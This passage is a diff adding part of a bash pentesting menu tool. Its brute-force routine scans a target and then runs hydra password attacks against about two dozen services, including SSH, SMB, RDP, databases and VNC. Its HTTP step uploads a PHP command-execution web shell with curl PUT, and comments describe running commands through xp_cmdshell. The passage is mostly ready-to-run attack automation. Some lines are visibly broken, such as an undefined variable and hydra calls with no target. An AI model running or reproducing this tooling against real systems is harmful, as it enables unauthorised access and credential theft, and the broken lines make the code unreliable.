+    ${DGrey}|──${BRed}[${DGrey} 02 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Having Fun with the network (Internal) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 03 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Port Scan - Service discovery ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 04 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Searching service version exploits ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 05 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Pentesting Services ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 06 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Phishing ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 07 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Getting Shell ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 08 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Inside ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 09 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Exfiltration ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 10 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Privilege Escalation ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 11 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Post ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 12 ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} Pivoting ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} MM ${BRed}]${BGreen}──╼ ${BRed}[${BYellow} More ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Pentesting Methodology ${BRed}]${BGreen}──╼  ")
+    read -p "$HacKingProMenuMain" cmd
+    case $cmd in
+      x|X|exit|quit|Exit )
+      clear
+      HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+      echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+      break
+      ;;
+      1|01 )
+      read -p "$Press_ENTER"
+      ;;
+    esac
+  done
+}
+
+# Brute Force Menu
+BruteForce(){
+
+  # Creating Scans and Output Folders
+  Report() {
+    cd "$XHacKingProCaseTargetName"
+    echo "${BGreen}┌─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
+    mkdir AttacKing
+    cd AttacKing
+    echo "${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Scans ${BRed}]"
+  	mkdir Scans Scans/${1} &> /dev/null
+    echo "${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Output ${BRed}]"
+    mkdir Output Output/${1} &> /dev/null
+    echo "${BGreen}└─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
+    read -p "$Press_ENTER"
+  }
+  Report
+
+  # Represent that Bruteforce finished
+  Finished_Brute() {
+    echo "[${green}*${default}] Bruteforce finished. Credentials found saved at: Output/${1}/."
+    sleep 1
+  }
+
+  ftp_up="${xAttacKing}/Wordlist/ftp_up.txt"
+  ftp_u="${xAttacKing}/Wordlist/ftp_u.txt"
+  ftp_p="${xAttacKing}/Wordlist/ftp_p.txt"
+  ssh_up="${xAttacKing}/Wordlist/ssh_up.txt"
+  ssh_u="${xAttacKing}/Wordlist/ssh_u.txt"
+  ssh_p="${xAttacKing}/Wordlist/ssh_p.txt"
+  smtp_u="${xAttacKing}/Wordlist/smtp_u.txt"
+  smtp_p="${xAttacKing}/Wordlist/smtp_p.txt"
+  pop_u="${xAttacKing}/Wordlist/pop_u.txt"
+  pop_p="${xAttacKing}/Wordlist/pop_p.txt"
+  telnet_up="${xAttacKing}/Wordlist/telnet_up.txt"
+  telnet_u="${xAttacKing}/Wordlist/telnet_u.txt"
+  telnet_p="${xAttacKing}/Wordlist/telnet_p.txt"
+  sql_u="${xAttacKing}/Wordlist/sql_u.txt"
+  sql_p="${xAttacKing}/Wordlist/sql_p.txt"
+  mssql_up="${xAttacKing}/Wordlist/mssql_up.txt"
+  mysql_up="${xAttacKing}/Wordlist/mysql_up.txt"
+  oracle_up="${xAttacKing}/Wordlist/oracle_up.txt"
+  postgres_up="${xAttacKing}/Wordlist/postgres_up.txt"
+  windows_u="${xAttacKing}/Wordlist/windows_u.txt"
+  windows_up="${xAttacKing}/Wordlist/windows_up.txt"
+  user="${xAttacKing}/Wordlist/user.txt"
+  pass="${xAttacKing}/Wordlist/pass.txt"
+  snmp_p="${xAttacKing}/Wordlist/snmp.txt"
+  vnc_p="${xAttacKing}/Wordlist/vnc_p.txt"
+  thread="16"
+
+  Port_Scan() {
+    echo " "
+  	echo "       ${BBlue}┌──[ 🎯 ]──[${BRed} Target ${BBlue}]──╼ ${BGreen} ${targetIP} ${BBlue}|  Number of threads: ${BGreen} ${thread}."
+  	echo "       ${BBlue}└──[ 🎯 ]──[${BRed} Agressive ${BBlue}]──╼ ${DGrey} Starting agressive scan of supported ports against: ${BGreen} ${targetIP}...\n"
+  	sleep 1
+  	sudo nmap -T4 -Pn -v --open ${targetIP} -p 21,22,23,25,53,80,110,139,162,389,443,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,6667,8000,8080 >> "nmap.log"
+  	echo "[${yellow}*${default}] Scan finished."
+  	read -p "$Press_ENTER"
+  	pwd
+  	ls
+    read -p "$Press_ENTER"
+  	sleep 1
+  }
+  Port_Scan
+
+  echo " "
+
+  # Port 21 - (FTP)
+  BruteFTP(){
+    # - Name:
+    # - Version:
+    # - Anonymous login:
+    if grep -q 21/tcp $XHacKingProCaseTargetNameAttacKing/nmap.log; then
+      echo "        ${BBlue}┌──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 21(FTP) is open. Starting bruteforce...\n"
+      BruteFTP_Open="$(echo " ${BBlue}[${BGreen} Open ${BBlue}] ")"
+      AfterBruteFTP="${BruteFTP_Open}"
+      # echo "${AfterBruteFTP}"
+      sleep 1
+      nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 ${targetIP}
+      hydra -C $ftp_up ${targetIP} ftp -e ns -o Output/${targetIP}/ftp_${targetIP}.txt -I -V -t $thread
+      hydra -L $ftp_u -P $ftp_p ${targetIP} ftp -e ns -o Output/${targetIP}/ftp1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}┌──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 21(FTP) is not open. Skipping to next port..."
+      BruteFTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
+      AfterBruteFTP="${BruteFTP_Close}"
+      # echo "${AfterBruteFTP}"
+    fi
+  }
+  BruteFTP
+
+  #  Port 22 - (SSH)
+  BruteSSH(){
+    # - Name:
+    # - Version:
+    # - Protocol:
+    # - RSA-key-fingerprint:
+    # - Takes-password:
+    # If you have usernames test login with username:username
+    if grep -q 22/tcp nmap.log; then
+      BruteSSH_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 22(SSH) is open. Starting bruteforce...\n")"
+      AfterBruteSSH="${BruteSSH_Open}"
+      echo "${AfterBruteSSH}"
+		  sleep 1
+		  hydra -C $ssh_up ${targetIP} ssh -e ns -o Output/${targetIP}/ssh_${targetIP}.txt -I -V -t $thread
+      hydra -L $ssh_u -P $ssh_p ${targetIP} ssh -e ns -o Output/${targetIP}/ssh1_${targetIP}.txt -I -V -t $thread
+		  hydra -L $user -p $pass ssh -e ns -o Output/${targetIP}/ssh2_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      BruteSSH_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 22(SSH) is not open. Skipping to next port...")"
+      AfterBruteSSH="${BruteSSH_Close}"
+      echo "${AfterBruteSSH}"
+    fi
+  }
+  BruteSSH
+
+  #  Port 23 - (Telnet)
+  BruteTelnet(){
+    if grep -q 23/tcp nmap.log; then
+      BruteTelnet_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 23(Telnet) is open. Starting bruteforce...\n")"
+      AfterBruteTelnet="${BruteTelnet_Close}"
+      echo "${AfterBruteTelnet}"
+      sleep 1
+      hydra -C $telnet_up ${targetIP} telnet -e ns -o Output/${targetIP}/telnet_${targetIP}.txt -I -V -t $thread
+      hydra -L "$telnet_u" -P "$telnet_p" "${targetIP}" telnet -e ns -o Output/"${targetIP}"/telnet1_"${targetIP}".txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} telnet -e ns -o Output/${targetIP}/telnet2_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      BruteTelnet_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 23(Telnet) is not open. Skipping to next port...")"
+      AfterBruteTelnet="${BruteTelnet_Close}"
+      echo "${AfterBruteTelnet}"
+    fi
+  }
+  BruteTelnet
+
+  #  Port 25 - (SMTP)
+  BruteSMTP(){
+    # - Name:
+    # - Version:
+    # - VRFY:
+    # - EXPN:
+    if grep -q 25/tcp nmap.log; then
+      BruteSMTP_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 25(SMTP) is open. Starting bruteforce...\n")"
+      AfterBruteSMTP="${BruteSMTP_Open}"
+      nc -nvv ${targetIP} 25
+      # echo "${AfterBruteSMTP}"
+      sleep 1
+      nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 ${targetIP}
+      hydra -L $user -P $pass ${targetIP} smtp-enum -e ns -o Output/${targetIP}/smtp-enum_${targetIP}.txt -I -V -t $thread
+	    hydra -L $smtp_u -P $smtp_p ${targetIP} smtp -e ns -o Output/${targetIP}/smtp_${targetIP}.txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} smtp -e ns -o Output/${targetIP}/smtp1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      BruteSMTP_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 25(SMTP) is not open. Skipping to next port...")"
+      AfterBruteSMTP="${BruteSMTP_Close}"
+      echo "${AfterBruteSMTP}"
+    fi
+ }
+  BruteSMTP
+
+  #  Port 80 - (HTTP)
+  BruteHTTP(){
+    # - Server:
+    # - Scripting language:
+    # - Apache Modules:
+    # - Domain-name address:
+    # - Web application
+    # - Name:
+    # - Version:
+   if grep -q 80/tcp nmap.log; then
+     echo "        ${AfterBruteHTTP} ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 80(HTTP) is open. Starting bruteforce...\n"
+     BruteHTTP_Open="$(echo " ${BBlue}[${BGreen} Open ${BBlue}] ")"
+     AfterBruteHTTP="${BruteHTTP_Open}"
+     echo ""
+     # Nikto
+     nikto -h http://${targetIP}
+
+     # Nikto with squid proxy
+     nikto -h ${targetIP} -useproxy http://${targetIP}:4444
+
+     # Get header
+     curl -i ${targetIP}
+
+     # Get everything
+     curl -i -L ${targetIP}
+
+     # Check if it is possible to upload using put
+     curl -v -X OPTIONS http://${targetIP}/
+     curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://${targetIP}/test/shell.php
+
+     # Check for title and all links
+     dotdotpwn.pl -m http -h ${targetIP} -M GET -o unix
+
+	   sleep 1
+	   hydra -L $user -P $pass ${targetIP} service http-get -o Output/${targetIP}/http-get_${targetIP}.txt -I -V / -t $thread
+     Finished_Brute "${targetIP}"
+   else
+
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 80(HTTP) is not open. Skipping to next port..."
+     BruteHTTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
+     AfterBruteHTTP="${BruteHTTP_Close}"
+     # echo "${AfterBruteHTTP}"
+   fi
+ }
+  BruteHTTP
+
+  #  Port 110 - (POP3)
+  BrutePOP3(){
+    # - Name:
+    # - Version:
+    if grep -q 110/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 110(POP3) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $pop_u -P $pop_p ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_${targetIP}.txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 110(POP3) is not open. Skipping to next port..."
+    fi
+  }
+  BrutePOP3
+
+  #  Port 139 - (SMB)
+  BruteSMB(){
+    # - Name:
+    # - Version:
+    # - Domain/workgroup name:
+    # - Domain-sid:
+    # - Allows unauthenticated login:
+    if grep -q 139/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 139(SMB) is open. Starting bruteforce...\n"
+      sleep 1
+      enum4linux -a ${targetIP}
+      smbclient -L ${targetIP}
+      nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse ${targetIP} -p 445
+      hydra -L $windows_u -P $pass ${targetIP} smb -S 139 -e ns -o Output/${targetIP}/smb_139_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 139(SMB) is not open. Skipping to next port..."
+    fi
+
+  }
+  BruteSMB
+
+  #  Port 162 - (SNMP)
+  BruteSNMP(){
+    if grep -q 162/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 162(SNMP) is open. Starting bruteforce..."
+      sleep 1
+      nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes ${targetIP}
+      snmp-check -t ${targetIP} -c public  # Common community strings:    [  public   /   private   /   community  ]
+
+      hydra -P $snmp snmp -S 162 -e ns -o Output/${targetIP}/snmp_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 162(SNMP) is not open. Skipping to next port..."
+    fi
+  }
+  BruteSNMP
+
+  #  Port 389 - (LDAP)
+  BruteLDAP(){
+    if grep -q 389/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 389(LDAP) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $windows_u -P $pass ${targetIP} service ldap2 -S 389 -e ns -o Output/${targetIP}/ldap2_${targetIP}.txt -I -V -t $thread
+      hydra -L $windows_u -P $pass ${targetIP} service ldap3 -S 389 -e ns -o Output/${targetIP}/ldap3_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 389(LDAP) is not open. Skipping to next port..."
+    fi
+
+  }
+  BruteLDAP
+
+  #  Port 443 - (HTTPS)
+  BruteHTTPS(){
+    if grep -q 443/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 443(HTTPS) is open. Starting bruteforce...\n"
+      sleep 1
+      sslscan ${targetIP}:443
+      hydra -l $user -P $pass ${targetIP} service https-get -s 443 -o Output/${targetIP}/https-get_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 443(HTTPS) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTPS
+
+  #  Port 445 - (SMB)
+  BruteSMB445(){
+    if grep -q 445/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 445(SMB) is open. Starting bruteforce...\n"
+      sleep 1
+      enum4linux -a ${targetIP}
+      smbclient -L ${targetIP}
+      nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse ${targetIP} -p 445
+      hydra -C $windows_up ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_${targetIP}.txt -I -V -t $thread
+      hydra -L $windows_u -P $pass ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_2_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 445(SMB) is not open. Skipping to next port..."
+   fi
+  }
+  BruteSMB445
+
+  #  Port 512 - (Rexec)
+  BruteREXEC(){
+    if grep -q 512/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 512(rexec) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rexec -S 512 -e ns -o Output/${targetIP}/rexec_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 512(rexec) is not open. Skipping to next port..."
+    fi
+  }
+  BruteREXEC
+
+  #  Port 513 - (Rlogin)
+  BruteRLOGIN(){
+    if grep -q 513/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 513(rlogin) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rlogin -S 513 -e ns -o Output/${targetIP}/rlogin_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 513C(rlogin) is not open. Skipping to next port..."
+   fi
+  }
+  BruteRLOGIN
+
+  #  Port 514 - (RSH)
+  BruteRSH(){
+    if grep -q 514/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 514(rsh) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rsh -S 514 -e ns -o Output/${targetIP}/rsh_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(rsh) is not open. Skipping to next port..."
+    fi
+  }
+  BruteRSH
+
+  #  Port 993 - (IMAP)
+  BruteIMAP(){
+    if grep -q 993/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 993(IMAP) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} imap -S 993 -e ns -o Output/${targetIP}/imap_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 993(IMAP) is not open. Skipping to next port..."
+    fi
+  }
+  BruteIMAP
+
+  #  Port 1433 - (MSSQL)
+  BruteMSSQL(){
+     # - Version:
+
+     # use auxiliary/scanner/mssql/mssql_ping
+     # Last options. Brute force.
+     # scanner/mssql/mssql_login
+
+     # If you have credentials look in metasploit for other modules
+
+     # Log in to mssql
+     # sqsh -S INSERTIPADDRESS -U sa
+
+     # Execute commands
+     # xp_cmdshell 'date'
+     # go
+     if grep -q 1433/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1433(mssql) is open. Starting bruteforce.../n"
+       sleep 1
+
+       hydra -C $mssql_up ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_${targetIP}.txt -I -V -t $thread
+       hydra -L $windows_u -P $pass ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+       echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1433(mssql) is not open. Skipping to next port..."
+     fi
+
+   }
+  BruteMSSQL
+
+  # Port 1521 - (Oracle)
+  BruteOracle(){
+    # - Name:
+    # - Version:
+    # - Password protected:
+    if grep -q 1521/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1521(oracle) is open. Starting bruteforce...\n"
+      sleep 1
+      tnscmd10g version -h ${targetIP}
+      tnscmd10g status -h ${targetIP}
+      hydra -C $oracle_up ${targetIP} oracle -S 1521 -e ns -o Output/${targetIP}/oracle_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1521(oracle) is not open. Skipping to next port..."
+   fi
+
+  }
+  BruteOracle
+
+  ### Port 2049 - NFS
+  # showmount -e INSERTIPADDRESS
+  ### If you find anything you can mount it like this:
+  # mount INSERTIPADDRESS:/ /tmp/NFS
+  # mount -t INSERTIPADDRESS:/ /tmp/NFS
+
+  #  Port 3306 (MySQL)
+  BruteMySQL(){
+     # - Name:
+     # - Version:
+     if grep -q 3306/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3306(mysql) is open. Starting bruteforce...\n"
+       sleep 1
+       mysql --host=${targetIP} -u root -p
+       nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 ${targetIP} -p 3306
+
+       hydra -C $mysql_up ${targetIP} mysql -e ns -o Output/${targetIP}/mysql_${targetIP}.txt -I -V -t $thread
+       hydra -L $sql_u -P $sql_p $TARGET mysql -e ns -o Output/${targetIP}/mysql_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3306(mysql) is not open. Skipping to next port..."
+  fi
+
+   }
+  BruteMySQL
+
+  ### Port 3339 - Oracle web interface
+  # - Basic info about web service (apache, nginx, IIS)
+  # - Server:
+  # - Scripting language:
+  # - Apache Modules:
+  # - IP-address:
+  # - Domain-name address:
+
+  #  Port 3389 (RDP) Remote Desktop
+  BruteRDP(){
+     # Test logging in to see what OS is running
+     # rdesktop -u guest -p guest ${targetIP} -g 94%
+
+     # Brute force
+     # ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://${targetIP}
+
+     if grep -q 3389/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3389(RDP) is open. Starting bruteforce...\n"
+       sleep 1
+       hydra -C $windows_u ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_${targetIP}.txt -I -V -t $thread
+       hydra -L $windows_u -P $pass ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3389(RDP) is not open. Skipping to next port..."
+  fi
+
+   }
+  BruteRDP
+
+  #  Port 5432 (PostGres)
+  BrutePostgres(){
+    if grep -q 5432/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5432(postgres) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -C $postgres_up ${targetIP} postgres -e ns -o Output/${targetIP}/postgres_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5432(postgres) is not open. Skipping to next port..."
+    fi
+  }
+  BrutePostgres
+
+  #  Port 5900 (VNC)
+  BruteVNC(){
+    if grep -q 5900/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5900(VNC) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -P $vnc_p ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_${targetIP}.txt -I -V -t $thread
+      hydra -P $pass ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5900(VNC) is not open. Skipping to next port..."
+    fi
+  }
+  BruteVNC
+
+  #  Port 5901 (VNC)
+  BruteVNC5901(){
+   if grep -q 5901/tcp nmap.log; then
+    echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5901(VNC) is open. Starting bruteforce...\n"
+		sleep 1
+		hydra -P $vnc_p ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
+		hydra -P $pass ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
+		Finished_Brute "${targetIP}"
+   else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5901(VNC) is not open. Skipping to next port..."
+   fi
+}
+  BruteVNC5901
+
+  #  Port 6667 (IRC)
+  BruteIRC(){
+    if grep -q 6667/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 6667(IRC) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} irc -s 6667 -e ns -o Output/${targetIP}/irc_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 6667(IRC) is not open. Skipping to next port..."
+    fi
+  }
+  BruteIRC
+
+  #  Port 8000 (HTTP HEAD)
+  BruteHTTP8000(){
+    if grep -q 8000/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8000(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -s 8000 -f -q -e ns -o Output/${targetIP}/http-head_8000_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(HTTP HEAD) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTP8000
+
+  #  Port 8080 (HTTP HEAD)
+  BruteHTTP8080(){
+    if grep -q 8080/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8080(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -S 8080 -f -q -e ns -o Output/${targetIP}/http-head_8080_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8080(HTTP HEAD) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTP8080
+
+  #  Port 8100 (HTTP HEAD)
+  BruteHTTP8100(){
+    if grep -q 8100/tcp nmap.log; then
+      echo "        ${BBlue}└──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8100(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -S 8100 -f -q -e ns -o Output/${targetIP}/http-head_8100_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
